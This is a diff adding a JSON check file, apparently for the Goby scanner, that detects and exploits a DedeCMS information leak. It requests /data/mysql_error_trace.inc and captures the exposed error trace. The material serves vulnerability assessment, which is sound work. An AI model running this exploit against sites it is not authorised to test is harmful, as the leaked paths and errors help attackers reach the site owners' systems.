@@ -1,0 +1,103 @@
+{
+  "Name": "DedeCMS mysql_error_trace.inc infoleak",
+  "Description": "Due to improper configuration of decms, sensitive information is leaked",
+  "Product": "DedeCMS",
+  "Homepage": "http://www.dedecms.com/",
+  "DisclosureDate": "2021-06-16",
+  "Author": "sharecast.net@gmail.com",
+  "GobyQuery": "app=\"DedeCMS\"",
+  "Level": "2",
+  "Impact": "<p>By constructing a special URL address, the attacker triggers the system web application to report an error, and obtains the sensitive information of the website in the echo content.</p><p>The attacker uses the leaked sensitive information to obtain the web path of the website server and provide help for further attacks.</p>",
+  "Recommendation": "<p>The error information of the website is returned uniformly and processed fuzzily.</p><p>Encryption and proper storage of sensitive information files, file name randomization, to avoid leakage of sensitive information.</p>",
+  "References": [
+    "https://blog.csdn.net/weixin_34237700/article/details/113464714"
+  ],
+  "HasExp": true,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/data/mysql_error_trace.inc",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "<?php  exit();",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/data/mysql_error_trace.inc",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "<?php  exit();",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": [
+    "Disclosure of Sensitive Information"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
